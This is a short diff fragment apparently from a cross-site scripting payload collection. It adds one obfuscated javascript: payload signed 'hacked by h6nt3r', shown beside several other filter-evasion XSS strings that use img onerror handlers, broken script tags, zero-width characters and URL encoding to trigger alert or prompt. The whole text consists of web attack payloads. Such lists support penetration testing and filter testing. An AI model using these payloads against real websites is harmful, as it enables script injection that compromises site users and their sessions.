@@ -165,3 +165,4 @@ Testing%22+data-toggle%3Dcollapse+data-target%3D%3Cimg%26%23x20%3Bsrc%3Dx%26%23x
 "></scri%0Apt><​script>prompt(`Got%20an%20XSS%20would%20you%20like%20to%20say%20something?`)%3B<%2Fscript>
 1'"><img/src/onerror​=.1|alert``>
 "><img src=x onerror=prompt(1);>
+javascript​:const originx="hacked by h6nt3r",var{a:onerror}={a:%2561lert};throw originx
